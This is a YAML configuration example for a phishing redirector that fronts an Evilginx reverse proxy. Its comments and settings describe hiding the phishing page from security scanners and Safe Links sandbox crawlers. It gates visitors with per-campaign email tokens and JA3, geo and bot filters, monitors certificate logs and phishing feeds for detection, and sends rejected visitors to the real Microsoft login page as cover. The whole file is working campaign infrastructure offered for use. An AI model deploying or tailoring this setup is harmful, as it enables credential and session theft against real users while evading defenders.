# ═══════════════════════════════════════════════════════════════════════
# InfraGuard - Evilginx Example
# ═══════════════════════════════════════════════════════════════════════
#
# Redirector fronting an Evilginx reverse proxy. Two operating modes:
#
#   Mode 1 (with phishlet): Set profile_path to a phishlet YAML file.
#     InfraGuard parses it to extract login paths and auth_urls for
#     precise path-based filtering.
#
#   Mode 2 (without phishlet): All paths forwarded (Evilginx default).
#     Use allowed_paths to restrict if the phishlet paths are known.
#
# IP/bot/geo/JA3 filters protect against scanners discovering the phishlet
# before the campaign starts. Sandbox filter blocks Safe Links crawlers.
#
# Stack:
#   Target (email link) → InfraGuard (443) → Evilginx (443 internal)
#
# Required env vars:
#   INFRAGUARD_TLS_CERT      - path to TLS cert (Evilginx manages its own certs;
#                               InfraGuard TLS cert is for the redirector layer)
#   INFRAGUARD_TLS_KEY       - path to TLS key
#   EVILGINX_UPSTREAM        - e.g. https://127.0.0.1:4443
#   CAMPAIGN_TOKEN_Q1        - per-campaign token in email links
#   INFRAGUARD_DB_PATH       - SQLite path

listeners:
  - protocol: "https"
    bind: "0.0.0.0"
    port: 443
    tls:
      cert: "${INFRAGUARD_TLS_CERT}"
      key: "${INFRAGUARD_TLS_KEY}"
    domains:
      - "login.example.com"

domains:
  login.example.com:
    upstream: "${EVILGINX_UPSTREAM}"
    profile_type: "evilginx"
    # profile_path: "/config/profiles/wordpress-phishlet.yaml"  # optional phishlet file

    # Without phishlet all paths forward. With phishlet InfraGuard restricts
    # to the paths parsed from it. Override with allowed_paths if needed:
    # allowed_paths:
    #   - "/wp-login.php"
    #   - "/wp-admin/*"
    #   - "~^/[a-z]{8}$"     # Evilginx lure path pattern (8-char alpha)

    campaign_token:
      enabled: true
      token_param: "t"
      tokens:
        - "${CAMPAIGN_TOKEN_Q1}"
      score_on_missing: 0.9               # very aggressive - almost all non-email visitors blocked

    drop_action:
      type: "proxy"
      target: "https://login.microsoftonline.com"

pipeline:
  filter_mode: "scoring"
  block_score_threshold: 0.65
  enable_ip_filter: true
  enable_bot_filter: true
  enable_header_filter: true
  enable_geo_filter: true
  enable_dns_filter: true
  enable_profile_filter: true
  enable_replay_filter: false
  enable_enumeration_filter: true
  enable_sandbox_filter: true
  enable_ja3_filter: true
  ja3_filter:
    ja3_header: "x-ja3"
    log_ja3: true
    blocked_ja3:
      - "e7d705a3286e19ea42f587b344ee6865"
      - "c35b0c7bd583d49d5b0f17de25ecdf7a"
      - "6734f37431670b3ab4292b8f60f29984"
      - "b386946a5a44d1ddcc843bc75336dfce"

intel:
  auto_block_scanners: true
  dynamic_whitelist_threshold: 3
  feeds:
    enabled: true
  ct_monitor:
    enabled: true
    interval_hours: 4.0
    monitored_domains:
      - "login.example.com"
  reputation_monitor:
    enabled: true
    interval_hours: 2.0
    check_urlhaus: true
    check_openphish: true

tracking:
  db_path: "${INFRAGUARD_DB_PATH}"
  retention_days: 14

api:
  bind: "127.0.0.1"
  port: 8080
  health_path: "/up"

logging:
  level: "INFO"
  format: "json"
